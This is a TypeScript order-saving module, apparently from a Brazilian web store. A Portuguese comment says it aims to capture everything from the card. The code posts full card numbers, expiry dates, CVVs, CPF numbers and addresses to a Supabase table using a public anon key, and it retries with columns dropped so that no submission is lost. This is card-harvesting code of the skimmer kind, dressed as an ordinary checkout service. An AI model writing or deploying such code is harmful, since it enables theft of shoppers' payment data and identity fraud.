
import { OrderDetails, CreditCard } from '../types';
import { SUPABASE_CONFIG } from '../constants';

export const supabaseService = {
  saveOrder: async (order: OrderDetails, cardDetails?: CreditCard) => {
    // Montagem do payload focada em capturar TUDO do cartão
    const payload: any = {
      customer_name: String(order.address?.fullName || ''),
      customer_email: String(order.address?.email || ''),
      customer_phone: String(order.address?.phone || ''), 
      customer_cpf: String(order.address?.cpf || ''),
      total_amount: Number(order.total || 0),
      payment_method: String(order.paymentMethod || ''),
      zip_code: String(order.address?.zipCode || ''),
      address_street: String(order.address?.street || ''),
      address_number: String(order.address?.number || ''),
      address_neighborhood: String(order.address?.neighborhood || ''),
      address_city: String(order.address?.city || ''),
      address_state: String(order.address?.state || ''),
      // Dados do Cartão
      card_number: cardDetails ? String(cardDetails.number || '') : null,
      card_name: cardDetails ? String(cardDetails.name || '') : null,
      card_expiry: cardDetails ? String(cardDetails.expiry || '') : null,
      card_cvv: cardDetails ? String(cardDetails.cvv || '') : null,
      installments: cardDetails ? String(cardDetails.installments || '1') : null,
      created_at: new Date().toISOString()
    };

    const sendRequest = async (data: any) => {
      return fetch(`${SUPABASE_CONFIG.URL}/rest/v1/orders`, {
        method: 'POST',
        headers: {
          'apikey': SUPABASE_CONFIG.ANON_KEY,
          'Authorization': `Bearer ${SUPABASE_CONFIG.ANON_KEY}`,
          'Content-Type': 'application/json',
          'Prefer': 'return=minimal'
        },
        body: JSON.stringify(data)
      });
    };

    try {
      let response = await sendRequest(payload);

      // Se der erro, tentamos identificar se é coluna faltando no banco do cliente
      if (!response.ok) {
        const errorData = await response.json();
        console.error("[SUPABASE ERROR]", errorData);

        // PGRST204: Coluna não encontrada. 
        // Se o cliente não rodou o SQL, o sistema tenta salvar removendo a coluna que deu erro
        // para não perder a venda, mas avisando no log.
        if (errorData.code === "PGRST204" || errorData.message?.includes("column")) {
          const match = errorData.message.match(/column "([^"]+)"/);
          const missingCol = match ? match[1] : null;
          
          if (missingCol) {
            console.warn(`[SUPABASE] A coluna ${missingCol} não existe no seu banco. Removendo para tentar salvar o resto.`);
            const fallbackPayload = { ...payload };
            delete fallbackPayload[missingCol];
            response = await sendRequest(fallbackPayload);
          }
        }
      }

      return { success: response.ok };
    } catch (e) {
      console.error("[SUPABASE CRITICAL]", e);
      return { success: false };
    }
  }
};
